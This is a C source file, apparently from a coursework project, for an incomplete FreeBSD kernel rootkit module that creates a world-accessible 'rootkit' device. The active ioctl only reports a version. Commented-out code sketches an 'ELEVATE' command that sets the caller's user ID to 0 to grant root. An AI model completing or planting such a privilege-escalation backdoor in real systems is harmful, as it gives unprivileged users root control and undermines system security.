#include <sys/param.h>
#include <sys/conf.h>
#include <sys/errno.h>
#include <sys/proc.h>
#include <sys/systm.h>

#include "interface.h"

// NOT COMPLETE, CURRENTLY ONLY A TEST IMPLEMENTATION, WAS GOING TO SEE IF COMMUNICATION ACTUALLY WORKS BUT FREEBSD IS FAILING ME


static struct cdev *rootkit_dev;

static int
rootkit_ioctl(struct cdev *dev, u_long cmd,
    caddr_t data, int fflag, struct thread *td)
{
    (void)dev;
    (void)fflag;
    (void)td;

    switch (cmd) {
    case RK_GET_VERSION:
        *(int *)data = 1;
        return (0);

    default:
        return (ENOTTY);
    }
}

// static int
// rootkit_ioctl(struct cdev *dev, u_long cmd, caddr_t data, int fflag, struct thread *td) {
//     (void)dev;
//     (void)fflag;

// 	struct proc *p = td->td_proc;

//     switch (cmd) {
//     case ELEVATE:
//         p = td->td_proc;
//         PROC_LOCK(p);
//         p->p_ucred->cr_uid = 0;
//         PROC_UNLOCK(p);
//         break;

//     default:
//         return (ENOTTY);
//     }
// }

//  uid = 0;
//  newcred = crget();
//  uip = uifind(uid);
//  PROC_LOCK(p);
// 	change_ruid(newcred, uip); ????? maybe this is what I need to do to elevate? clarify if using freeBSD kernel functions is allowed
                                // or if I need to do it manually by changing the process struct's credentials

static struct cdevsw rootkit_cdevsw = {
    .d_version = D_VERSION,
    .d_name = "rootkit",
    .d_ioctl = rootkit_ioctl
};

int make_rk_dev(void) {
    return make_dev_p(
        MAKEDEV_CHECKNAME | MAKEDEV_WAITOK,
        &rootkit_dev,
        &rootkit_cdevsw,
        NULL,
        UID_ROOT,
        GID_WHEEL,
        0666,
        "rootkit"
    );
}

void destroy_rk_dev(void) {
    if (rootkit_dev != NULL) {
        destroy_dev(rootkit_dev);
        rootkit_dev = NULL;
    }
}